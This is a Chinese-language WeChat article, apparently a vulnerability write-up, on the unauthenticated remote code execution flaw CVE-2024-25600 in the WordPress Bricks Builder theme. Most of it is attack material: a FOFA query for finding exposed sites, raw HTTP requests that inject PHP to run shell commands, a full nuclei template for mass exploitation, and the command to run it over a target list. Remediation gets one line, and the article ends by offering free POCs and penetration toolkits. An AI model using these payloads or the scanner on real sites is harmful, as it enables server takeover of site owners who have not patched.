<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qmbZMH_oYrve8NXXIRqs6A)

免责申明：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

01

—

漏洞名称

WordPres Bricks Builder RCE 漏洞

02

—  

漏洞影响

Bricks Builder <= 1.9.6

03

—  

漏洞描述

Bricks Builder 是一款用于 WordPress 的开发主题，提供直观的拖放界面，用于设计和构建 WordPress 网站。WordPress 配置安装的 Brick Builder 主题在低于 <= 1.9.6 版本中存在远程代码执行漏洞。

04

—  

FOFA 搜索语句

  

```
body="/wp-content/themes/bricks/"

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOOiaVbrr8J642KN7dq60ia2GOuPmObgZDJA4YYcvqw8s2dYicic0RmuCKZlw57GYBu8pGQ0Nm08hWj4A/640?wx_fmt=png&from=appmsg)

05

—  

漏洞复现

第一步，获取网站的 nonce 值

```
GET / HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
Connection: close
Accept-Encoding: gzip

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOOiaVbrr8J642KN7dq60ia2GMhdY4lNa8OFqyzcmgTf0M6cpqdzIadO5DXALjSg0lP8298ibZJFfklw/640?wx_fmt=png&from=appmsg)

第二步，向靶场发送如下数据包执行 id 命令

```
POST /wp-json/bricks/v1/render_element HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
Connection: close
Content-Length: 356
Content-Type: application/json
Accept-Encoding: gzip
{
  "postId": "1",
  "nonce": "第一步获得的值",
  "element": {
    "name": "container",
    "settings": {
      "hasLoop": "true",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "ob_start();echo `id`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);",
        "objectType": "post"
      }
    }
  }
}

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOOiaVbrr8J642KN7dq60ia2G29JugoLOcd9gAhwcAcRYLoK7LfSicicupBN3YY7ZDEt9CHt5CAYVLTOA/640?wx_fmt=png&from=appmsg)

漏洞复现成功

06

—  

批量扫描脚本

nuclei poc 文件内容如下

```
id: CVE-2024-25600
info:
  name: Unauthenticated Remote Code Execution – Bricks <= 1.9.6
  author: christbowel
  severity: critical
  description: |
    Bricks Builder is a popular WordPress development theme with approximately 25,000 active installations. It provides an intuitive drag-and-drop interface for designing and building WordPress websites. Bricks <= 1.9.6 is vulnerable to unauthenticated remote code execution (RCE) which means that anybody can run arbitrary commands and take over the site/server. This can lead to various malicious activities
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25600
    - https://wpscan.com/vulnerability/afea4f8c-4d45-4cc0-8eb7-6fa6748158bd/
    - https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6
    - https://github.com/Chocapikk/CVE-2024-25600
    - https://op-c.net/blog/cve-2024-25600-wordpresss-bricks-builder-rce-flaw-under-active-exploitation
  metadata:
    publicwww-query: "/wp-content/themes/bricks/"
    verified: true
    max-request: 2
  tags: cve,cve2024,wpscan,wordpress,wp-plugin,wp,bricks,rce
http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: \{\{Hostname\}\}
      - |
        POST /wp-json/bricks/v1/render_element HTTP/1.1
        Host: \{\{Hostname\}\}
        Content-Type: application/json
        {
          "postId": "1",
          "nonce": "\{\{nonce\}\}",
          "element": {
            "name": "container",
            "settings": {
              "hasLoop": "true",
              "query": {
                "useQueryEditor": true,
                "queryEditor": "ob_start();echo `id`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);",
                "objectType": "post"
              }
            }
          }
        }
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "Exception:"
          - "uid=([0-9(a-z-)]+) gid=([0-9(a-z-)]+) groups=([0-9(a-z-)]+)"
        condition: and
    extractors:
      - type: regex
        name: nonce
        part: body
        group: 1
        regex:
          - 'nonce":"([0-9a-z]+)'
        internal: true
# digest: 4a0a0047304502200825dcce3678d271573926754136ccd219fed98b4224e0d037ae0df099af337c022100ad0aff9a59a433275ece8b3ba693d51b7c10de39801f51c9256acefb4de536e5:922c64590222798bb761d5b6d8e72950

```

运行 POC

```
nuclei.exe -l data/CVE-2024-25600.txt -t mypoc/cve/CVE-2024-25600.yaml

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOOiaVbrr8J642KN7dq60ia2Gg7pnVhkfmJevj0SmkZujYpjAnHUJoPbrrQwHoNV6pcG9OTcXBNvW7A/640?wx_fmt=png&from=appmsg)

07

—  

修复建议

升级到最新版本。

08

—  

新粉丝福利领取

在公众号主页或者文章末尾点击发送消息免费领取。

发送【电子书】关键字获取电子书

发送【POC】关键字获取 POC

发送【工具】获取渗透工具包